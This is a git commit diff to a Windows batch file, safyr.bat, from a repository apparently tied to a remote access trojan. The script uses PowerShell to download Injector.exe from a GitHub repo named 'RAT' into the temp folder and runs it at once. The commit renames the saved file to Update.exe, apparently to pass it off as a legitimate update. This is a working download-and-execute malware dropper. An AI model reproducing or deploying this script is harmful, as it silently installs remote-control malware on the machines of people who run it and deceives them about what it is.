07704461464418f745fcdfbd0680a74c30ffd6ec
GLICHED-HACKER <143979463+GLICHED-HACKER@users.noreply.github.com>
2025-07-04 12:33:30 -0400

    Update safyr.bat

--- safyr.bat
+++ safyr.bat
@@ -1,5 +1,5 @@
 @echo off
-set "TEMPFILE=%TEMP%\temp.exe"
+set "TEMPFILE=%TEMP%\Update.exe"
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/GLICHED-HACKER/RAT/raw/refs/heads/main/Injector.exe' -OutFile '%TEMPFILE%'"
 start "" "%TEMPFILE%"
 exit /b
